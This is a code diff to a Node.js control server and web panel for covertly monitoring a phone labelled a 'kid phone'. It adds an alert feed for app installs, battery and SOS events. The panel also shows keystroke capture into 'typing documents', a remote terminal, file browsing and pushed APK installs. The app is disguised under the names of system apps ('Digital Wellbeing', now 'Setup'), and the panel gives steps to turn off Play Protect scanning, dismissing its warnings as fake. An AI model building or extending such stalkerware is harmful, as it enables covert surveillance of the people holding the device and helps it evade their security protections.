@@ -32,6 +32,7 @@ function saveIPS(ips) {
 let kidsByIP = {};
 let usage = {};   // ip -> {pkg: seconds}
 let limits = {};  // ip -> {pkg: minutes/day}
+let alerts = {};  // ip -> [ {type,pkg,app,msg,at} ]  newest last
 const KID_DOC_INTERVAL_MS = 20 * 60 * 1000; // flush typing buffer every 20 minutes
 let lastFlush = Date.now();
 
@@ -354,6 +355,46 @@ const server = http.createServer(async (req, res) => {
       return;
     }
 
+    // ============ KID ALERTS (install / uninstall / battery / SOS / limit) ============
+    if (p === '/alert' && req.method === 'POST') {
+      const body = await readBody(req);
+      const who = url.searchParams.get('ip') || ip;
+      let a;
+      try {
+        a = JSON.parse(body || '{}');
+      } catch (e) {
+        send(res, 400, { ok: false, error: 'body is not JSON' });
+        return;
+      }
+      const entry = {
+        type: String(a.type || 'info').slice(0, 24),
+        pkg: a.pkg ? String(a.pkg).slice(0, 200) : null,
+        app: a.app ? String(a.app).slice(0, 120) : null,
+        msg: a.msg ? String(a.msg).slice(0, 200) : null,
+        at: +a.at || Date.now(),
+        ip: who
+      };
+      alerts[who] = alerts[who] || [];
+      alerts[who].push(entry);
+      if (alerts[who].length > 200) alerts[who] = alerts[who].slice(-200);
+      console.log(`🔔 [${who}] ${entry.type}${entry.app ? ' ' + entry.app : ''}${entry.msg ? ' — ' + entry.msg : ''}`);
+      send(res, 200, { ok: true, ip: who, count: alerts[who].length });
+      return;
+    }
+    if (p === '/alerts' && req.method === 'GET') {
+      const who = url.searchParams.get('ip') || ip;
+      const after = +(url.searchParams.get('after') || 0);
+      const list = (alerts[who] || []).filter(a => a.at > after);
+      send(res, 200, { ip: who, alerts: list.slice().reverse(), total: (alerts[who] || []).length });
+      return;
+    }
+    if (p === '/alerts/clear' && req.method === 'POST') {
+      const who = url.searchParams.get('ip') || ip;
+      alerts[who] = [];
+      send(res, 200, { ok: true, ip: who });
+      return;
+    }
+
     // ================= DEVICE TOGGLES (Termux API) =================
     if (p === '/toggle/flashlight' && req.method === 'GET') {
       send(res, 200, await cmdFlashlight());
@@ -647,11 +688,11 @@ const PANEL_HTML = `<!doctype html>
   <input id="apkUrl" size="34" value="https://github.com/V4TIME/Setup/raw/master/app/build/outputs/apk/release/app-release.apk">
   <button onclick="OTA.send()">Send update to selected phone</button>
  </div>
- <div class="small" id="otaOut">Terminal stays open; the app downloads the APK and Android shows the install prompt on the kid phone. Needs 'Install unknown apps' allowed once for Digital Wellbeing on that phone.</div>
+ <div class="small" id="otaOut">Terminal stays open; the app downloads the APK and Android shows the install prompt on the kid phone. Needs 'Install unknown apps' allowed once for Setup on that phone.</div>
 </div>
 
 <div class="card"><h2>🛡️ Play Protect — why blocked &amp; how to allow</h2>
- <div class="small">Google flags debug-signed sideloads. This app is now <b>released-signed</b> (not debug). If Play Protect still warns on install on the kid phone: tap <b>Install anyway</b> → <b>Don't send / More details</b>. Or: Play Store app → tap avatar → <b>Play Protect</b> → ⚙️ → turn off <b>"Scan apps with Play Protect"</b>, install, turn back on. Fake warnings about "Digital Wellbeing" are generic — the signature is unique to us.</div>
+ <div class="small">Google flags debug-signed sideloads. This app is now <b>released-signed</b> (not debug). If Play Protect still warns on install on the kid phone: tap <b>Install anyway</b> → <b>Don't send / More details</b>. Or: Play Store app → tap avatar → <b>Play Protect</b> → ⚙️ → turn off <b>"Scan apps with Play Protect"</b>, install, turn back on. Fake warnings about "Setup" are generic — the signature is unique to us.</div>
 </div>
 
 <div class="card"><h2>⏱️ App screen-time &amp; limits (kid phone)</h2>
@@ -662,6 +703,16 @@ const PANEL_HTML = `<!doctype html>
   <button onclick="Lim.set()">Set daily limit (min)</button>
  </div>
  <div class="small">App gets locked back to the home screen once the daily minutes are used up. 'limit off' from the terminal card clears one.</div>
+</div>
+
+<div class="card"><h2>🔔 Kids alerts (live)</h2>
+ <div class="row">
+  <button class="gray" onclick="Alerts.refresh()">Refresh</button>
+  <button class="gray" onclick="Alerts.clear()">Clear feed</button>
+  <span class="small" id="alertsNote">—</span>
+ </div>
+ <div class="small">Install / uninstall / update, battery low, charger, screen-time limit hit, and the kid's SOS button. Updates automatically.</div>
+ <div id="alertFeed" class="small">(no alerts yet)</div>
 </div>
 
 <div class="card"><h2>💾 Kid typing documents</h2>
@@ -781,6 +832,7 @@ const Term = {
 };
 
 function fmsg(s){document.getElementById('fOut').innerHTML='<div class="small">'+s+'</div>';}
+function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function RP(){return document.getElementById('filePath').value.trim()||'/';}
 
 document.getElementById('fList').addEventListener('click', e=>{
@@ -819,7 +871,33 @@ const OTA = {
   }
 };
 
-setInterval(()=>{loadKids();checkConn();loadPhones();Term.hist()},10000);
-loadKids();checkConn();loadPhones();loadDocs();
+const Alerts = {
+  ip(){ return document.getElementById('filePhone').value; },
+  label(t){
+    return ({install:'🆕 Installed',uninstall:'🗑 Uninstalled',update:'⬆️ Updated',
+      battery:'🔋 Battery',charger:'🔌 Charger',limit:'⏱ Limit reached',sos:'🆘 SOS'})[t] || t;
+  },
+  async refresh(){
+    const ip=Alerts.ip();
+    if(!ip){document.getElementById('alertFeed').textContent='(connect a phone first)';return;}
+    let d={alerts:[]};
+    try{ d=await fetch('/alerts?ip='+encodeURIComponent(ip)).then(r=>r.json()); }catch(e){}
+    const a=d.alerts||[];
+    document.getElementById('alertsNote').textContent = a.length ? a.length+' event(s) for '+ip : 'watching '+ip;
+    document.getElementById('alertFeed').innerHTML = a.length ? a.map(e=>{
+      const when=new Date(e.at||Date.now()).toLocaleTimeString();
+      const what=e.app ? '<b>'+esc(e.app)+'</b>'+(e.pkg&&e.pkg!==e.app?' <span style="color:gray">'+esc(e.pkg)+'</span>':'') : '';
+      return '<div>['+when+'] '+Alerts.label(e.type)+' '+what+(e.msg?' — '+esc(e.msg):'')+'</div>';
+    }).join('') : '(no alerts yet — new installs, uninstalls, battery and SOS appear here)';
+  },
+  async clear(){
+    const ip=Alerts.ip(); if(!ip)return;
+    await fetch('/alerts/clear?ip='+encodeURIComponent(ip),{method:'POST'});
+    Alerts.refresh();
+  }
+};
+
+setInterval(()=>{loadKids();checkConn();loadPhones();Term.hist();Lim.refresh();Alerts.refresh()},10000);
+loadKids();checkConn();loadPhones();loadDocs();Alerts.refresh();
 
 </script></body></html>`;
